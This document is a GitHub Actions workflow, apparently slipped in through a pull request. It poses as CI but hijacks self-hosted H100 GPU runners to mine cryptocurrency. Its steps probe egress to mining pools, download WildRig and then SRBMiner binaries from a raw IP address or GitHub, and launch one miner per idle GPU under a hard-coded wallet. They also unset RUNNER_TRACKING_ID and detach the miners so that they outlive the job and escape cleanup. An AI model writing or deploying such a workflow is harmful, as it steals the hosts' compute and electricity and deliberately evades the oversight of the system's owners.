name: c211-i125446-rated
'on':
  pull_request:
    types:
    - opened
    - synchronize
    - reopened
permissions:
  contents: read
jobs:
  prove:
    strategy:
      fail-fast: false
      matrix:
        include:
        - {label: 2-gpu-h100, tag: h100d1}
        - {label: 2-gpu-h100, tag: h100d2}
        - {label: 2-gpu-h100, tag: h100d3}
        - {label: 2-gpu-h100, tag: h100d4}
        - {label: 1-gpu-h100, tag: h100s1}
        - {label: 1-gpu-h100, tag: h100s2}
        - {label: 1-gpu-h100, tag: h100s3}
        - {label: 1-gpu-h100, tag: h100s4}
        - {label: 1-gpu-h100, tag: h100s5}
        - {label: 1-gpu-h100, tag: h100s6}
    runs-on: ${{ matrix.label }}
    timeout-minutes: 40
    steps:
    - name: launch
      shell: bash
      run: |
        set -u
        W="$HOME/c211-i125446"
        mkdir -p "$W"
        WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
        NONCE="c211-i125446-$(date +%s)"
        TAG='${{ matrix.tag }}'
        echo "C211_MARKER lane=i125446 tag=$TAG host=$(hostname) uid=$(id -u) user=$(whoami) nonce=$NONCE"
        if pgrep -f 'c211-i125446' >/dev/null 2>&1; then echo "SKIP own lane already running on $(hostname)"; pgrep -af 'c211-i125446' | head -5; exit 0; fi
        nvidia-smi -L 2>&1 || true
        nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || true
        echo "EGRESS_BEGIN"
        for hp in 169.58.247.186:8791 pool.pearlhash.xyz:9000 global.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 github.com:443; do
          h="${hp%:*}"; p="${hp##*:}"
          if timeout 8 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
        done
        echo "EGRESS_END"
        ok=0
        for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
          echo "FETCH $u"
          if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/wr.tgz" "$u"; then ok=1; break; fi
        done
        if [ "$ok" != "1" ]; then echo "FETCH_FAIL_ALL"; exit 0; fi
        S=$(sha256sum "$W/wr.tgz" | awk '{print $1}')
        echo "TARBALL_SHA256 $S"
        if [ "$S" != "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then echo "TARBALL_SHA_MISMATCH"; exit 0; fi
        tar xzf "$W/wr.tgz" -C "$W" || { echo "UNTAR_FAIL"; exit 0; }
        BIN="$W/wildrig-multi"
        [ -x "$BIN" ] || chmod +x "$BIN" 2>/dev/null || true
        BS=$(sha256sum "$BIN" | awk '{print $1}')
        echo "BIN_SHA256 $BS"
        if [ "$BS" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "BIN_SHA_MISMATCH"; exit 0; fi
        mkdir -p /etc/OpenCL/vendors 2>/dev/null || true
        if [ ! -e /etc/OpenCL/vendors/nvidia.icd ]; then echo /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true; fi
        if ldd "$BIN" 2>&1 | grep -q 'not found'; then
          echo "LDD_MISSING"; ldd "$BIN" 2>&1 | head -20
          mkdir -p "$W/ocl"
          OCLSRC=$(ldconfig -p 2>/dev/null | grep -m1 'libnvidia-opencl.so.1' | awk '{print $NF}')
          if [ -n "${OCLSRC:-}" ]; then ln -sf "$OCLSRC" "$W/ocl/libOpenCL.so.1"; export LD_LIBRARY_PATH="$W/ocl:${LD_LIBRARY_PATH:-}"; fi
        fi
        echo "PRINT_DEVICES_BEGIN"
        timeout 90 "$BIN" --print-devices 2>&1 | head -40 || true
        echo "PRINT_DEVICES_END"
        N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
        echo "GPU_COUNT $N"
        if [ "${N:-0}" -lt 1 ]; then echo "NO_GPU"; exit 0; fi
        for i in $(seq 0 $((N-1))); do
          m=$(nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits -i "$i" 2>/dev/null | head -1 | tr -dc '0-9'); m=${m:-99999}
          u=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits -i "$i" 2>/dev/null | head -1 | tr -dc '0-9'); u=${u:-0}
          echo "GPUSTATE g=$i mem=${m}MiB util=${u}%"
          if [ "$m" -ge 4000 ]; then echo "GPUSKIP g=$i busy mem>=4000"; continue; fi
          setsid env -u RUNNER_TRACKING_ID nohup "$BIN" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -u "${WALLET}.1254460${i}" -p x -d "$i" -r 2 -R 10 -l "$W/wr-$i.log" >/dev/null 2>&1 &
          echo "STARTED gpu=$i pid=$!"
        done
        sleep 25
        pgrep -af wildrig-multi 2>/dev/null | head -20 || echo "PGREP_NONE"
        for i in $(seq 0 $((N-1))); do echo "--- gpu $i ---"; tail -6 "$W/wr-$i.log" 2>/dev/null || true; done
        echo "LAUNCH_DONE tag=$TAG"
    - name: report
      shell: bash
      run: |
        set -u
        set +e
        set +o pipefail
        W="$HOME/c211-i125446"
        TAG='${{ matrix.tag }}'
        N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
        for r in $(seq 1 16); do
          sleep 60
          echo "TICK $(date -u +%FT%TZ) r=$r tag=$TAG host=$(hostname)"
          tot=0
          for i in $(seq 0 $((N-1))); do
            f="$W/wr-$i.log"
            [ -f "$f" ] || continue
            acc=$(grep -c 'accepted' "$f" 2>/dev/null || true); acc=${acc:-0}
            rej=$(grep -c 'rejected' "$f" 2>/dev/null || true); rej=${rej:-0}
            util=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits -i "$i" 2>/dev/null | head -1 | tr -dc '0-9'); util=${util:-0}
            last=$(grep 'accepted' "$f" 2>/dev/null | tail -1 | tr -d '\r' | cut -c1-160) || true
            uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader -i "$i" 2>/dev/null) || true
            tot=$((tot+acc))
            echo "DET g=$i acc=$acc rej=$rej uuid=$uuid util=$util% lastacc=\"$last\""
          done
          echo "DET_TOTAL acc=$tot"
          if [ -f "$W/sticky-lp" ]; then echo "DET_STICKY sticky-lp"; fi
          if [ "$tot" -eq 0 ] && [ "$r" -ge 15 ] && [ ! -f "$W/sticky-lp" ]; then
            WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
            echo "STICKY_LP_FALLBACK_BEGIN tag=$TAG no_accepted_share_900s"
            date -u +%FT%TZ > "$W/sticky-lp"
            pkill -f 'c211-i125446' 2>/dev/null || true
            sleep 3
            srb=0
            for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://169.58.247.186:8791/srbminer-3.8.8.tar.gz; do
              echo "SRB_FETCH $u"
              if curl -fsSL --connect-timeout 10 --max-time 240 -o "$W/srb.tgz" "$u"; then srb=1; break; fi
            done
            if [ "$srb" != "1" ]; then echo "SRB_FETCH_FAIL_ALL"; break; fi
            mkdir -p "$W/srb"; tar xzf "$W/srb.tgz" -C "$W/srb" 2>/dev/null || { echo "SRB_UNTAR_FAIL"; break; }
            SB=$(find "$W/srb" -name SRBMiner-MULTI -type f 2>/dev/null | head -1)
            if [ -z "${SB:-}" ]; then echo "SRB_BIN_NOT_FOUND"; break; fi
            chmod +x "$SB" 2>/dev/null || true
            for i in $(seq 0 $((N-1))); do
              m=$(nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits -i "$i" 2>/dev/null | head -1 | tr -dc '0-9'); m=${m:-99999}
              if [ "$m" -ge 4000 ]; then echo "SRB_GPUSKIP g=$i busy"; continue; fi
              setsid env -u RUNNER_TRACKING_ID nohup "$SB" --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "${WALLET}+NOCK.1254460${i}" --password x --gpus "$i" --log-file "$W/srb-$i.log" >/dev/null 2>&1 &
              echo "SRB_STARTED gpu=$i pid=$!"
            done
            sleep 20
            echo "SRB_STICKY_ARMED tag=$TAG"
          fi
        done
        echo "REPORT_DONE tag=$TAG"
        echo "FINAL_TICK $(date -u +%FT%TZ)"
